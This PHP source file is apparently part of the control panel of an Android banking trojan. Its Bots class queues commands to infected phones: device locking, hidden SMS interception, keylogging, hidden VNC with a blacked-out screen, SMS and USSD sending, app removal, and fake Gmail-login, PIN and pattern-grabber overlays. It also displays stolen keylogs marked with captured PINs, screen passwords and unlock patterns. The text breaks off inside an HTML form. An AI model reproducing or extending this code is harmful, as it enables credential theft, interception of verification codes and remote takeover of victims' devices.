<?php
require_once("../config.php");
require_once("../smarts.class.php");
require_once("commands.class.php");
require_once("vnc.class.php");

class Bots
{
	public $db;
//	const ALIVE_HOURS = 5; // bot 100% alive
	const LAST_SEEN_HOURS = 12; // after it bot treats as DEAD
	static $special_injects = array(
		"gmail" => "Gmail Login Fake",
		"pattern" => "Pattern Grabber",
		"pin" => "Pin Grabber (6 digits)",
		"acsb" => "Accessibility Hint",
	);

	static $special_statuses = array(
		"gmail" => "By command",
		"pattern" => "By command",
		"acsb" => "Automatically",
	);
	
	function __construct($db)
	{
		$this->db = $db;
	}
	
	function lock($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			
			$this->db->fetch("update bots set is_locked=1 where bot_id={$bot_id2}");
			
			
			$this->db->fetch("delete from bots_tasks where task_type in('lock_on', 'lock_off') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'lock_on', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return $this->msg_ok("Bot locked");
		else
			return $this->msg_ok("{$sz} bots locked");
	}
	
	function unlock($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			
			$this->db->fetch("update bots set is_locked=0 where bot_id={$bot_id2}");
			
			$this->db->fetch("delete from bots_tasks where task_type in('lock_on', 'lock_off') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'lock_off', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return $this->msg_ok("Bot Unlocked");
		else
			return $this->msg_ok("{$sz} bots Unlocked");
	}
	
	function intercept_on($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			
			$this->db->fetch("update bots set is_sms_admin=1 where bot_id={$bot_id2}");

			$this->db->fetch("delete from bots_tasks where task_type in('intercept_on', 'intercept_off') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'intercept_on', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("SMS Intercept enabled");
	}
	
	function intercept_off($ids, $data)
	{
		foreach($ids as $id)
		{
			$bot_id2 = $this->db->escape($id);
			$this->db->fetch("update bots set is_sms_admin=0 where bot_id={$bot_id2}");
			
			$this->db->fetch("delete from bots_tasks where task_type in('intercept_on', 'intercept_off') and bot_id={$bot_id2}");
			
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'intercept_off', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->msg_ok("SMS Intercept disabled");
	}
	
	// select id from bots where .....
	// bot_id, not id!
	function delete_bots($sql, $with_inj_logs=false)
	{
		$bot_ids = $this->db->fetch($sql, true);

		if(!sizeof($bot_ids))
		{
			return true;
		}
		
		$this->db->fetch("delete from bots where bot_id in({$sql})");
		$this->db->fetch("delete from bots_tasks where bot_id in({$sql})");
		$this->db->fetch("delete from vnc_tasks where bot_id in({$sql})");
		$this->db->fetch("delete from sms where bot_id in({$sql})");
		$this->db->fetch("delete from pushes_bots where bot_id in({$sql})");
		$this->db->fetch("delete from smarts_bots where bot_id in({$sql})");
		//if($this->db->getLastError() != "")
		
		if($with_inj_logs)
		{
			$this->db->fetch("delete from smarts_data where bot_id in({$sql})");
		}
		
		foreach($bot_ids as $row)
		{
			$id = $row["bot_id"];

			$files = array(
				"../data/{$id}.log",
				"../data/vnc_{$id}_screenshot.jpg",
				"../data/vnc_{$id}.xml",
			);
			
			foreach($files as $f)
			{
				if(file_exists($f))
					@unlink($f);
			}
		}
		
		return true;
	}
	
	function delete_bot($id)
	{
		$bot_id2 = $this->db->escape($id);

		$this->db->fetch("delete from bots where bot_id={$bot_id2}");
		$this->db->fetch("delete from bots_tasks where bot_id={$bot_id2}");
		$this->db->fetch("delete from vnc_tasks where bot_id={$bot_id2}");
		$this->db->fetch("delete from sms where bot_id={$bot_id2}");
		$this->db->fetch("delete from pushes_bots where bot_id={$bot_id2}");
		$this->db->fetch("delete from smarts_bots where bot_id={$bot_id2}");
		$this->db->fetch("delete from smarts_data where bot_id={$bot_id2}");
		// smarts_data skipped
		
		$files = array(
			"../data/{$id}.log",
			"../data/vnc_{$id}_screenshot.jpg",
			"../data/vnc_{$id}.xml",
		);
		
		foreach($files as $f)
			if(file_exists($f))
				@unlink($f);

		return msg_ok("Bot deleted");
	}
	
	function format_keylog($bot_id, $filter)
	{
		$path = "../data/{$bot_id}.log";
		
		if(preg_match("/^[0-9A-z]+$/", $bot_id) && file_exists($path))
		{
			$log = htmlspecialchars(trim(file_get_contents($path)));
		}else{
			return "Bot not found";
		}
		
		$styles = array(
			"BOTLOG:" => "color: brown; font-weight: bold", 
			" clicked on " => "color: blue", 
			" clicked on:" => "color: blue", 
			" other :" => "color: black",
			" focused on " => "color: orange",
			" focused on:" => "color: orange",
			"PIN_PART:" => "font-weight: bold; color: black",
			"PIN_GOOD:" => "font-weight: bold; color: blue",
			"SCREEN_PASSWORD:" => "font-weight: bold; color: blue",
			"GOOD_PATTERN:" => "font-weight: bold; color: red",
			"TMP_PATTERN:" => "font-weight: bold; color: orange",
			"AT_ERROR:" => "color: red",
		);
		
		$rows = explode("\n", $log);
		$logf = "";

		$filters = apps2array($filter);

		foreach($rows as $row)
		{
			$row = trim($row);
			if($row == "") continue;
			
			if(sizeof($filters))
			{
				$has = false;
				foreach($filters as $f)
					if(trim($f) && stristr($row, $f))
					{
						$has = true;
						break;
					}
					
				if(!$has) continue;
			}

			foreach($styles as $word=>$style)
				$row = str_replace($word, "<span style='font-style: italic; $style'>{$word}</span>", $row);

			if(substr_count($row, " ") < 4 || !strstr($row, "GMT"))
			{
				$logf .= $row . "<br />";
				continue;
			}

			$parts = explode(" ", $row, 4);
			$gmt = $parts[0];
			$date = $parts[1];
			$time = $parts[2];
			$text = $parts[3];

			$row = "<a title='{$gmt} {$date}' class='log_msg'>{$time}</a> {$text}";
			
			$logf .= $row . "<br />";
		}

		if(trim($logf) == "") return "";
		
		return $logf;
	}
	
	function process_ajax($data)
	{
		if(!isset($data['ajax']))
			return;
		
		if($data['ajax'] == 'save_comment')
		{
			$comm_bot_id = $this->db->escape($data['comm_bot_id']);
			$comment = $this->db->escape($data['comment']);
			
			$sql = "update bots set comment={$comment} where bot_id={$comm_bot_id}";
			$this->db->fetch($sql);
			
			echo "SAVED_SUCCESS";
			
		}else if($data['ajax'] == 'show_keylog'){
			
			$path = "../data/{$data['bot_id']}.log";
			if(file_exists($path)) 
				echo $this->format_keylog($data['bot_id'], $data['filter']);
			else
				echo "<h2>File not found</h2>";

		}else if($data['ajax'] == 'get_uninstalled_apps'){
			
			echo $this->get_uninstalled_apps($data['bot_id']);
			
		}else if($data['ajax'] == 'get_mass_commands'){

			$html = file_get_contents("tpls/commands.html");
			
			if(isset($data['target_blank']))
			{
				$html = str_replace("<a ", "<a target='_blank' ", $html);
			}
			
			$bot_id = explode(",", $_REQUEST["ids"]);
			$commands = new Commands($this->db, $bot_id, $html);
			
			print($commands->draw());

		}else if($data['ajax'] == 'vnc_get_layout'){

			if(!isValidBotId($data['bot_id']))
			{
				echo "VNC_ERROR:BOT_NOT_FOUND";
				die;
			}
			
			$path = "../data/vnc_{$data['bot_id']}.xml";
			
			if(!file_exists($path))
			{
				echo "VNC_ERROR:BOT_NOT_FOUND";
				die;
			}

			$vnc = new Vnc();
			$layout = $vnc->draw($path, $data['bot_id'], $data['scale'], (int)$data['relative_left'], (int)$data['relative_top']);
			
			$bot_id2 = $this->db->escape($data['bot_id']);
			$d = $this->db->fetch("select vnc, extra_info_json, last_seen from bots where bot_id={$bot_id2}", true);
			
			$last_seen_marker = get_last_seen_marker($d[0]['last_seen']);
			$ago = last_seen_time($d[0]['last_seen']);
			
			$raw_status = $d[0]['vnc'];
			$vnc_status = VNC::formatStatus($data['bot_id'], $d[0]['vnc']);
			$extra_info_json = $d[0]['extra_info_json'];
			
			
			$taskdata = $this->db->fetch("select count(*) from vnc_tasks where bot_id={$bot_id2}", true);
			if(isset($taskdata[0]))
				$tasks = $taskdata[0]['count(*)'];
			else
				$tasks = 0;
				
			if($vnc_status == "")
			{
				echo 'VNC_ERROR:VNC_STOPPED';
				die;
			}
			
			$arr = array(
				'last_seen' => "$last_seen_marker $ago",
				'current_tasks' => $tasks,
				'status' => $vnc_status,
				'raw_status' => $raw_status,
				'layout' => $layout,
				'display_width' => $vnc->displayWidth,
				'display_height' => $vnc->displayHeight,
				'has_lockPatternView' => $vnc->has_lockPatternView,
				'is_layout_vertical' => $vnc->isLayoutVertical,
				'is_screen_unlocked' => (strstr($extra_info_json, 'SCREEN_UNLOCKED":1'))? true : false,
			);
			
			echo json_encode($arr);

		}else if($data['ajax'] == 'vnc_set_task'){

			$this->set_vnc_task($data['bot_id'], $data['type'], $data['data']);
			echo "ADDED_SUCCESS";

		//~ }else if($data['ajax'] == 'vnc_click_at'){

			//~ $this->set_vnc_task($data['bot_id'], 'click_at', $data['coords']);
			//~ echo "ADDED_SUCCESS";

		//~ }else if($data['ajax'] == 'vnc_set_text'){

			//~ $this->set_vnc_task($data['bot_id'], 'set_text', "{$data['uid']}|{$data['text']}");
			//~ echo "ADDED_SUCCESS";

		//~ }else if($data['ajax'] == 'vnc_send_long_click'){

			//~ $this->set_vnc_task($data['bot_id'], 'long_click', $data['uid']);
			//~ echo "ADDED_SUCCESS";

		//~ }else if($data['ajax'] == 'vnc_action'){

			//~ $this->set_vnc_task($data['bot_id'], 'action', $data['vnc_action']);
			//~ echo "ADDED_SUCCESS";
		}
		
		die;
	}
	
	function set_vnc_task($bot_id, $type, $data)
	{
		$bot_id2 = $this->db->escape($bot_id);
		$type = $this->db->escape($type);
		$data = $this->db->escape($data);

		$sql = "insert vnc_tasks values(null, {$bot_id2}, {$type}, {$data})"; // ON DUPLICATE KEY UPDATE data={$data};
		$this->db->fetch($sql);
	}
	
	function draw($data)
	{
		$this->process_ajax($data); // save comments in ajax
		
		$html = '';
		$page = (isset($_GET['page']))? $_GET['page'] : 'list';
		
		$ids = (isset($data['bbot_id'])) ? $this->clean_ids($data['bbot_id']) : [];
		$data['bbot_id'] = implode(",", $ids);

		$bots_sz = sizeof($ids);
		
		// One-click actions 
		if(isset($_GET['naction']))
		{
			$a = $_GET['naction']; // one-time actions without form to fill
			
			if($a == 'lock')
			{
				$html .= $this->lock($ids, $data);
				$page = "bot_page";

			}else if($a == 'unlock'){
				$html .= $this->unlock($ids, $data);
				$page = "bot_page";
				
			}else if($a == 'start_intercept'){
				$html .= $this->intercept_on($ids, $data);
				$page = "bot_page";

			}else if($a == 'stop_intercept'){
				$html .= $this->intercept_off($ids, $data);
				$page = "bot_page";

			}else if($a == 'delete_bot'){
				$html .= $this->delete_bot($data['bbot_id']);
				$page = "list";

			}else if($a == 'start_keylogger'){
				$html .= $this->start_keylogger($ids, $data);
				$page = "bot_page";
				
			}else if($a == 'stop_keylogger'){
				$html .= $this->stop_keylogger($ids, $data);
				$page = "bot_page";

			}else if($a == 'start_fg'){
				$html .= $this->start_fg($ids, $data);
				$page = "bot_page";
				
			}else if($a == 'stop_fg'){
				$html .= $this->stop_fg($ids, $data);
				$page = "bot_page";
				
			}else if($a == 'stop_vnc'){
				$html .= $this->stop_vnc($ids, $data);
				$page = "bot_page";

			}else if($a == 'kill_bot'){
				$html .= $this->kill_bot($ids, $data);
				$page = "bot_page";
			}else if($a == 'delete_olds'){
				$html .= $this->delete_olds($data);
			}
			
			if($bots_sz > 1)
			{
				$page = "list";
			 }
		}
		
		// Actions with forms to fill
		if($page == 'list')
			$html .= $this->draw_list($data); # bot list
		else if($page == 'sms')
			$html .= $this->draw_sms($data); # sms list - old
		else if($page == 'start_vnc')
			$html .= $this->draw_vnc($data); # start vnc
		else if($page == 'bot_page')
			$html .= $this->get_bot_main_page($data); # main bot page
		else if($page == 'tasks')
			$html .= $this->draw_tasks($data); # tasks list
		else if($page == 'ussd')
			$html .= $this->draw_ussd($data); # send ussd
		else if($page == 'push')
			$html .= $this->draw_push($data); # send push
		else if($page == 'send_sms')
			$html .= $this->draw_send_sms($data); # send sms
		else if($page == 'uninstall_apps')
			$html .= $this->uninstall_apps($data); # uninstall apps by list
		else if($page == 'open_url')
			$html .= $this->draw_open_url($data); # open url
		else if($page == 'run_app')
			$html .= $this->draw_run_app($data); # run app by pkg name
		else if($page == 'show_inject')
			$html .= $this->draw_show_inject($data); # run inject by pkg name
		return $html;
	}

	function go($url, $delay=0)
	{
		$delay = $delay * 1000;
		return "<script>setTimeout(function(){ location.href='{$url}'; }, {$delay})</script>";
	}

	function msg_ok($text, $autoclose=true)
	{
		$close = ($autoclose)? "true" : "false";
		return "<script>show_message('{$text}', 'ok', {$close})</script>";
	}

	function msg_err($text, $autoclose=true)
	{
		$close = ($autoclose)? "true" : "false";
		return "<script>show_message('{$text}', 'error', {$close})</script>";
	}
	
	function get_bot_main_page($data)
	{
		$bot_id = $data['bbot_id'];
		$bot_id2 = $this->db->escape($data['bbot_id']);

		$html = file_get_contents("tpls/bot_info.html");
		
		$sql = "select * from bots where bot_id={$bot_id2};";
		$res = $this->db->fetch($sql, true);
		if(!sizeof($res))
		{
			return "<script>show_message('Bot not found', 'error', false)</script>";
		}

		$bot = $res[0];

# LOCKED MARKER
		if($bot['is_locked'])
			$html = str_replace("%IS_LOCKED%", " class='' ", $html);
		else
			$html = str_replace("%IS_LOCKED%", " class='hidden' ", $html);
			
# INFO TABS 
		$html = str_replace("%CONTENT_SMS%", $this->draw_sms($data), $html);
		
		$smarts = new Smarts($this->db);
		$html = str_replace("%SMARTS_SZ%", $smarts->get_bot_smarts($bot_id, "size"), $html);
		
		$sms_sz = $this->db->fetch("select count(*) from sms where bot_id={$bot_id2}", true)[0]['count(*)'];
		$html = str_replace("%SMS_SZ%", $sms_sz, $html);
		
		$installed_apps = $this->db->fetch("select apps from bots where bot_id={$bot_id2}", true)[0]['apps'];

		$apps_arr = apps2array($installed_apps);
		//~ $apps_x = explode("|", $installed_apps);
		//~ $apps_arr = array_unique(array_filter($apps_x));
		$apps_sz = sizeof($apps_arr);
		$html = str_replace("%APPS_SZ%", $apps_sz, $html);

		$desired_apps_arr = $this->get_desired_apps($bot_id, $installed_apps);
		$desired_apps_sz = sizeof($desired_apps_arr);
		
		$html = str_replace("%DESIRED_APPS_SZ%", $desired_apps_sz, $html);
		
		$html = str_replace("%CONTENT_APPS%", $this->draw_apps($apps_arr), $html);
		$html = str_replace("%CONTENT_DESIRED_APPS%", $this->draw_desired_apps($desired_apps_arr), $html);
		$html = str_replace("%CONTENT_INJECTS%", $this->draw_injects($bot_id), $html);
		$html = str_replace("%CONTENT_PUSHES%", $this->draw_pushes($bot_id), $html);
		
		$html = str_replace("%BOT_ID%", $bot_id, $html);

# COMMANDS BUTTONS
		$cmd_html = file_get_contents("tpls/commands.html");
		$cmd_html = str_replace("<hr />", "", $cmd_html);
		
		$commands = new Commands($this->db, $bot_id, $cmd_html);
		$html = str_replace("%COMMANDS%", $commands->draw(), $html);

# BOT STATE ICONS + extra info, BOT INFO TABLE
		// $html = str_replace("%SCREEN_STATE%", , $html);
		$html = $this->make_bot_info_block($bot, $html);

		return $html;
	}

	function draw_tasks($data)
	{
		$bot_id = $data['bbot_id'];
		$bot_id2 = $this->db->escape($data['bbot_id']);
		
		$sql = "select comment from bots where bot_id={$bot_id2}";
		$comm = $this->db->fetch($sql, true)[0]['comment'];

		if($comm != "")
			$comm = "Comment: {$comm}";
			
		// last tasks list
		$html = "
		<div style='margin: 0 auto; width: 90%'>
		<h2 class='block'>
			Tasks
			<a href='?a=admin&action=bots&bbot_id={$data['bbot_id']}&page=tasks'><button class='btn btn-sm btn-info'><i class='flaticon-refresh-arrow' style='color: white'></i></button></a>
		</h2>
		
		<br />
		<p class='lightText'>
			<a href='?a=admin&action=bots&bbot_id={$data['bbot_id']}&page=bot_page'><button style='width: 50px' class='btn btn-primary btn-xs'><i class='flaticon-information-button' style='color: white'></i></button></a>
		#{$data['bbot_id']}<br />
		{$comm}
		</p>
		";
		
		if(isset($_GET['delete_task']))
		{
			$id = (int) $_GET['delete_task'];
			$sql = "delete from bots_tasks where bot_id={$bot_id2} and id={$id}";
			$this->db->fetch($sql);
			$html .= $this->msg_ok("task #{$id} deleted");
		}
		
		if(isset($_GET['repeat_task']))
		{
			$id = (int) $_GET['repeat_task'];
			
			$sql = "select bot_id, task_type, data from bots_tasks where id={$id}";
			$res = $this->db->fetch($sql, true);
			
			if(sizeof($res) && $res[0]['task_type'] == 'show_inject')
			{
				$sm = new Smarts($this->db);
				$sm->enable($res[0]['bot_id'], $res[0]['data']);
			}
			
			$sql = "update bots_tasks set status='waiting' where bot_id={$bot_id2} and id={$id}";
			$this->db->fetch($sql);
			$html .= $this->msg_ok("task #{$id} repeated");
		}
		
		$tasks = $this->db->fetch("select * from bots_tasks where bot_id={$bot_id2} order by id desc", true, null, PDO::FETCH_ASSOC);
		
		if(!sizeof($tasks))
			return $html . "<br /><center><h3>No tasks</h3></center>";
			
		$html .= "
		<table id='tasks_table' border='0' cellpadding='10' style='width: 100%' class='table table-bordered'>
		<tr class='block'>
			<th class='lightText'>ID</th>
			<th class='lightText'>Task</th>
			<th class='lightText'>Parameters</th>
			<th class='lightText'>Status</th>
			<th class='lightText'>Action</th>
		</tr>
		";
		
		
		foreach($tasks as $t)
		{
			$repeat = "<a href='?a=admin&action=bots&bbot_id={$bot_id}&page=tasks&repeat_task={$t['id']}'><button type='button' class='btn btn-warning btn-xs'><i class='flaticon-refresh-arrow' style='color: white'></i></button></a>"; // repeat button
					
			switch($t['status'])
			{
				case 'waiting':
					$status = '<span class="lightText" style="text-decoration: underline" title="Bot did not get this task yet">Waiting...</span>';
					$repeat = "";
					break;

				case 'in_process':
					$status = '<span class="lightText" style="text-decoration: underline" title="Bot executes this task right now">In process...</span>';
					$repeat = "";
					break;
					
				case 'failed':
					$status = '<span style="color: darkred" title="Bot failed on this task">Failed</span>';
					break;
					
				case 'success':
					$status = '<span class="lightText" title="Bot executed the task"><b>Executed</b></span>';
					break;
					
				default:
					$status = $t['status'];
					$repeat = "";
			}
			
			if($t['task_type'] == 'sms')
				$task_type = "Send SMS";
			else if($t['task_type'] == 'ussd')
				$task_type = "Send USSD";
			else if($t['task_type'] == 'lock_on')
				$task_type = "Lock device";
			else if($t['task_type'] == 'lock_off')
				$task_type = "Unlock device";
			else if($t['task_type'] == 'push')
				$task_type = "Push notification";
			else if($t['task_type'] == 'intercept_on')
				$task_type = "Enable hidden SMS intercept";
			else if($t['task_type'] == 'intercept_off')
				$task_type = "Disable hidden SMS intercept";
			else if($t['task_type'] == 'start_keylogger')
				$task_type = "Start keylogger";
			else if($t['task_type'] == 'stop_keylogger')
				$task_type = "Stop keylogger";
			else if($t['task_type'] == 'start_fg')
				$task_type = "Start Antisleep";
			else if($t['task_type'] == 'stop_fg')
				$task_type = "Stop Antisleep";
			else if($t['task_type'] == 'open_url')
				$task_type = "Open URL";
			else if($t['task_type'] == 'run_app')
				$task_type = "Run app";
			else if($t['task_type'] == 'kill_bot')
				$task_type = "Kill bot";
			else if($t['task_type'] == 'uninstall_apps')
				$task_type = "Uninstall apps";
			else if($t['task_type'] == 'vnc_start')
				$task_type = "VNC Start";
			else if($t['task_type'] == 'vnc_stop')
				$task_type = "VNC Stop";
			else if($t['task_type'] == 'show_inject')
				$task_type = "Show Inject";
			else
				$task_type = $t['task_type'];

			$task_data = $t['data'];
			
			if($t['task_type'] == 'show_inject' && array_key_exists($t['data'], Bots::$special_injects))
				$task_data = Bots::$special_injects[$t['data']];

			$html .= "<tr>
				<td width='50'>{$t['id']}</td>
				<td width='150'>{$task_type}</td>
				<td>{$task_data}</td>
				<td width='150'>{$status}</td>
				<td width='150'>
					<a href='?a=admin&action=bots&bbot_id={$bot_id}&page=tasks&delete_task={$t['id']}'><button class='btn btn-danger btn-xs' onclick='return confirm(\"Sure?\")'><i class='flaticon-trash' style='color: white'></i></button></a>
					
					{$repeat}
				</td>
			</tr>";
		}
		
		$html .= "</table>
		</div>";

		return $html;
	}
	
	function draw_apps($apps_arr)
	{
		$t = "<ul class='blackOL'>";
		foreach($apps_arr as $a)
			$t .= "<li><a href='https://play.google.com/store/apps/details?id={$a}' target='_blank'>{$a}</a></li>";
		
		$t .= "</ul>";
		return $t;
	}
	
	function draw_pushes($bot_id)
	{
		$bot_id2 = $this->db->escape($bot_id);

		if(isset($_POST['all_bot_pushes']))
		{
			$all_bot_pushes = explode(",", $_POST['all_bot_pushes']);
			
			$enabled_pkgs = [];
			if(isset($_POST['inj']))
			foreach($_POST['inj'] as $key=>$val)
			{
				$enabled_pkgs[] = $val;
			}
			
			$sql = "delete from `pushes_bots` where bot_id={$bot_id2};";
			$this->db->fetch($sql);
			
			foreach($all_bot_pushes as $pkg)
			{
				if(trim($pkg) == "") continue;
				
				if(!in_array($pkg, $enabled_pkgs))
				{
					# disable pkg for the bot
					$sql = "INSERT into `pushes_bots` values (NULL, {$bot_id2}, '{$pkg}', '0') ON DUPLICATE KEY UPDATE enabled=0;";
					$this->db->fetch($sql);
				}
			}
		}
		
		// globally locked pkgs - $blocked_glob
		$sql = "select value from config where name='block_push_apps';";
		$res = $this->db->fetch($sql, true);
		if(!sizeof($res)) return "Loading error";
		
		$blocked_glob = package_list_to_array($res[0]['value']); // globally disabled pkgs
		
		// bot locked pkgs - $blocked_bot
		$sql = "select pkg, enabled from pushes_bots where bot_id={$bot_id2};";
		$res2 = $this->db->fetch($sql, true);
		
		$blocked_bot = [];
		if(sizeof($res2))
		foreach($res2 as $r)
		{
			if(!$r['enabled'])
				$blocked_bot[] = $r['pkg'];
		}
		
		// all injects - $injects
		$sql = "select package from smarts";
		$res3 = $this->db->fetch($sql, true);
		
		$injects = [];
		if(sizeof($res3))
		foreach($res3 as $r)
			$injects[] = $r['package'];
		
		// all bot apps - $installed_apps
		$sql = "select apps from bots where bot_id={$bot_id2}";
		$res = $this->db->fetch($sql, true);
		$installed_apps = (sizeof($res))? package_list_to_array($res[0]['apps']) : [];
		
		// table 1 - installed injects
		// table 2 - rest of apps
		
		// foreach $installed_apps
		// 		if app in $injects - add to first table, otherwise - to second table
		
			// 	if app in $blocked_glob -- show "Blocked", continue
			// if app in $blocked_bot, show enabled-status
			
		// hidden field $all_bot_pushes

		$table_1 = "
		<h3>Apps with injects (%SIZE%)</h3>
		<table border='0' style='width: 100%; margin: 0 auto' class='table table-bordered botpage_table'>
		<tr>
			<th>Package</th>
			<th width=100>Push</th>
		</tr>
		";
		
		$table_2 = "
		<h3>Other apps (%SIZE%)</h3>
		<table border='0' style='width: 100%; margin: 0 auto' class='table table-bordered botpage_table'>
		<tr>
			<th>Package</th>
			<th>Push</th>
		</tr>
		";
		
		$t1_size = $t2_size = 0;
		$all_bot_pushes = "";
		foreach($installed_apps as $ia)
		{
			if(in_array($ia, $blocked_glob)){
				$h = "<tr>
				<td><label style='font-weight: normal' for='chk_{$ia}'>{$ia}</label></td>
				<td>Disabled</td>
			</tr>";
			
			}else if(in_array($ia, $blocked_bot)){
				$h = "<tr>
				<td><label style='font-weight: normal' for='chk_{$ia}'>{$ia}</label></td>
				<td><input id='chk_{$ia}' type='checkbox' name='inj[{$ia}]' value='{$ia}' /></td>
			</tr>";
				$all_bot_pushes .= $ia.",";
			}else{
				$h = "<tr>
				<td><label style='font-weight: normal' for='chk_{$ia}'>{$ia}</label></td>
				<td><input id='chk_{$ia}' type='checkbox' name='inj[{$ia}]' value='{$ia}' checked /></td>
			</tr>";
				$all_bot_pushes .= $ia.",";
			}
			
			if(in_array($ia, $injects))
			{
				$table_1 .= $h;
				$t1_size++;
			}else{
				$table_2 .= $h;
				$t2_size++;
			}
		}
		
		$table_1 = str_replace("%SIZE%", $t1_size, $table_1);
		$table_2 = str_replace("%SIZE%", $t2_size, $table_2);
		
		$table_1 .= "</table>";
		$table_2 .= "</table>";

		$html = "<form method='post'>
		<input type='submit' value='Save' class='btn btn-primary' />
		<span style='float: right'>Disable checkbox to block push notifications from the app</span>
		<div class='row'>
			<div class='col-md-6'>{$table_1}</div>
			<div class='col-md-6'>{$table_2}</div>
		</div>
		
		<br />
		<input type='text' name='all_bot_pushes' value='{$all_bot_pushes}' />
		</form>"; 
		
		return $html;
	}
	
	function draw_injects($bot_id)
	{
		$bot_id2 = $this->db->escape($bot_id);
		$smarts = new Smarts($this->db);
		
		$injects = $smarts->get_bot_smarts($bot_id, "data");
		if(!sizeof($injects)) return "<center>No injects</center>";
		
		$out = "";
		
		// update is_active values with `smarts_bots`
		$ids = [];
		foreach($injects as $inj)
			$ids[] = $inj['id'];
			
		$ids_str = implode(",", $ids);
		$sql = "select smart_id, is_active from smarts_bots where bot_id={$bot_id2} and smart_id in({$ids_str})";
		$res = $this->db->fetch($sql, true);
		
		$disabled_by_bot = [];
		if(sizeof($res))
		foreach($res as $row)
			$disabled_by_bot[$row['smart_id']] = $row['is_active'];
		
		$sql = "select apps from bots where bot_id={$bot_id2}";
		$res = $this->db->fetch($sql, true);
		$bot_apps = apps2array($res[0]['apps']);
		
		$head = file_get_contents('tpls/smarts_inject_head.html');
		foreach($injects as $inj)
		{
			// update is_active by smarts_bots value
			if(array_key_exists($inj['id'], $disabled_by_bot))
				$inj['is_active'] = $disabled_by_bot[$inj['id']];
			
			// get logs
			$sql = "select id, time, data from smarts_data where bot_id={$bot_id2} and smart_id={$inj['id']}";
			$res = $this->db->fetch($sql, true);
			$logs_sz = sizeof($res);
			
			$html = $head;
			$html = str_replace('%ICON%', icon_img($inj['icon']), $html);
			$html = str_replace('%GROUP%', $inj['sgroup'], $html);
			
			if(array_key_exists($inj['package'], Bots::$special_injects))
				$pname = Bots::$special_injects[$inj['package']];
			else
				$pname = $inj['package'];
			
			$html = str_replace('%PACKAGE%', $pname, $html);
			
			if($inj['stype'] == "url" && $inj['data'] != "")
			{
				list($url, $close_rule) = explode(":CLOSE_ON:", $inj['data'], 2);
				$html = str_replace('%URL_SHOW%', '', $html);
				$html = str_replace('%URL%', $url, $html);
				$surl = (strlen($url) < 50)? $url : substr($url, 0, 50) . "...";
				$html = str_replace('%URL_SHORT%', $surl, $html);
			}else{
				$html = str_replace('%URL_SHOW%', "hidden", $html);
			}
			
			$html = str_replace('%LOGS_SZ%', $logs_sz, $html);
			
			$status = $smarts->getStatus($inj['package'], $inj['is_active'], ($inj['cap_data'] != ""), ($logs_sz > 0), $bot_apps);
			$html = str_replace('%STATE%', $status, $html);
			
			$butt = admin::makeSmartButts($inj['id'], $inj['package'], $inj['is_active'], $logs_sz, $bot_id);
			$html = str_replace('%BUTT%', $butt, $html);
			
			$html = str_replace('%LOGS%', $smarts->getLogsTable($inj['id'], $inj['package'], $bot_id), $html);
			$html = str_replace('%SID%', $inj['id'], $html);
			
			$out .= $html . "<hr />";
		}

		return $out;
	}
	
	function draw_desired_apps($apps_arr)
	{
		if(!sizeof($apps_arr))
			return "<div class='text-center'>No desired apps</div>";

		$t = "<ul class='blackOL'>";

		foreach($apps_arr as $a)
		{
			$t .= "<li><a href='https://play.google.com/store/apps/details?id={$a}' target='_blank'>{$a}</a></li>";
		}

		$t .= "</li></table>";
		
		return $t;
	}

	function draw_vnc($data)
	{
		$bot_id2 = $this->db->escape($data['bbot_id']);
		
		$chk_acsb = $this->db->fetch("select extra_info_json from bots where bot_id={$bot_id2}", true);
		if(!sizeof($chk_acsb) || !strstr($chk_acsb[0]['extra_info_json'], '"HAS_ACSB":1') )
		{
			$html = msg_err("VNC is inaccessible on that bot.<br />Accessibility permission is required.", false);
			$html .= "<meta http-equiv='refresh' content='3; url=index.php?action=bots' />";
			return $html;
		}
		
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$formButtsVis = "";
		
		$title = "Start VNC";
		
		if(isset($_POST['set_vnc_options']))
		{

			$this->db->fetch("delete from bots_tasks where task_type in('vnc_start', 'vnc_stop') and bot_id={$bot_id2}");

			if($_POST['vnc_hidden'] == "hidden")
				$vnc_data = "STREAM_LAYOUT;";
			else
				$vnc_data = "STREAM_LAYOUT;STREAM_SCREEN;";

			if(isset($_POST['vnc_silent']))
				$vnc_data .= "SILENT;";

			if(isset($_POST['vnc_black']))
				$vnc_data .= "BLACK;";

			$vnc_data = $this->db->escape($vnc_data);

			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'vnc_start', {$vnc_data}, 'waiting')";
			$this->db->fetch($sql);
			
			$content = "<p class='lightText text-center'>Redirecting to VNC Sessions list...</p>";
			$content .= "<meta http-equiv='refresh' content='3; url=index.php?a=admin&action=vnc' />"; // &bot_id={$data['bbot_id']}&scale=0.4
			$content .= msg_ok("Task added to the Bot Task list", true);
			
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{
			$content = "<input type='hidden' name='set_vnc_options' value='1' />
			
<script>
function updateCheckboxes()
{
	if($('input[name=\"vnc_hidden\"]:checked').val() == \"hidden\")
	{
		$('#chk_black').prop(\"disabled\", false)
		$('#chk_black').prop(\"checked\", true)
	}else{
		$('#chk_black').prop(\"disabled\", true)
		$('#chk_black').prop(\"checked\", false)
	}
	
}
</script>

<br />
<div class='row'>
	<div class='col-md-6 lightText'>
		<input id='chk_hidden' onchange='updateCheckboxes()' type='radio'  checked name='vnc_hidden' value='hidden' />&nbsp;&nbsp;<label for='chk_hidden'>Hidden VNC&nbsp;&nbsp;</label>
	</div>
	<div class='col-md-6 lightText'>
		<input id='chk_screen' onchange='updateCheckboxes()' type='radio' name='vnc_hidden' value='screen' />&nbsp;&nbsp;<label for='chk_screen'>Screen Streaming&nbsp;</label>
	</div>
</div>
<br />
<div class='row'>
